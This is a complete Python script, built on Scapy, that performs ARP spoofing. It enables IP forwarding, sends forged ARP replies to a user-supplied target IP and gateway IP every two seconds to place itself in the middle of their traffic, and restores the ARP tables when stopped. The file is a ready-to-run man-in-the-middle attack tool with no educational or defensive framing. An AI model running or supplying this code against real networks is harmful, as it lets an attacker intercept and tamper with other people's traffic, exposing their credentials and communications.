from scapy.all import ARP, Ether, send, srp
import os
import sys
import time

def enable_ip_forwarding():
    """
    Enables IP forwarding on the machine to forward packets between the victim and the gateway.
    """
    if sys.platform == 'linux' or sys.platform == 'darwin':
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    elif sys.platform == 'win32':
        os.system('netsh interface ipv4 set global forwarding=enabled')
    else:
        print("[!] Unsupported OS for enabling IP forwarding.")
        sys.exit(1)

def get_mac(ip):
    """
    Resolves the MAC address for a given IP.
    """
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip):
    """
    Sends a spoofed ARP response to the target, associating the attacker's MAC with the spoofed IP.
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Could not resolve MAC for IP {target_ip}. Exiting.")
        sys.exit(1)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, gateway_ip):
    """
    Restores the original ARP table by sending the correct ARP responses.
    """
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if not target_mac or not gateway_mac:
        print("[!] Failed to restore ARP table. Exiting.")
        sys.exit(1)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Please run as root.")
        sys.exit(1)

    target_ip = input("Enter target IP: ")
    gateway_ip = input("Enter gateway IP: ")

    enable_ip_forwarding()
    print("[*] IP forwarding enabled.")

    try:
        print("[*] Starting ARP spoofing. Press Ctrl+C to stop.")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopping ARP spoofing and restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] ARP tables restored. Exiting.")

